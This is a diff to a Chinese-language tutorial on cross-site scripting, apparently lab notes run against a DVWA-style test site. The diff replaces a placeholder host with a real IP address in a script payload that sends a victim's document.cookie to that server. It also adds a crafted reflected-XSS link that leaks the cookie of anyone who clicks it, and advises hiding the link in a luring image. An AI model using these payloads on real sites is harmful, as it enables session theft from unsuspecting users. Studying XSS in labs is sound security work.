@@ -35,16 +35,20 @@ img标签支持onerror 事件，在装载文档或图像的过程中如果发生
     3、img变量的值是alert（document.cookie）
 ```
 ### 6、发送当前cookie到某个服务器
-#### 必须登陆才能访问cookie
-#### 一般情况下，从web服务的日志中查看cookie
-#### 把cookie弹出来，访问这个http链接，上传到服务器日志
+```yaml
+1、必须登陆才能访问cookie
+2、一般情况下，从web服务的日志中查看cookie
+3、把cookie弹出来，访问这个http链接，上传到服务器日志
+```
 #### 用法就是
 ```shell script
-<script> var img=document.createElement("img");img.src="http://xxxx/a?"+escape(document.cookie);
+<script> var img=document.createElement("img");img.src="http://81.70.88.52/a?"+escape(document.cookie); </script>
 ```
-#### 以下链接，谁点，就发送谁172.16.120.252:8080的cookie到 http://xxxx/a?
+#### 登陆81.70.88.52查看日志
+![image](https://github.com/498946975/Security/blob/master/images/xss_15.png)
+#### 以下链接，谁点，就发送谁172.16.120.252:8080的cookie到 http://81.70.88.52/b?
 ```shell script
-http://172.16.120.252:8080/vulnerabilities/xss_r/?name=<script> var img=document.createElement("img");img.src="http://xxxx/a?"+escape(document.cookie);
+http://172.16.120.252:8080/vulnerabilities/xss_r/?name=<script> var img=document.createElement("img");img.src="http://81.70.88.52/b?"+escape(document.cookie); </script>
 ```
 #### 诱导性图片，嵌入以上链接，更容易得手。
 ### 7、常用攻击场景
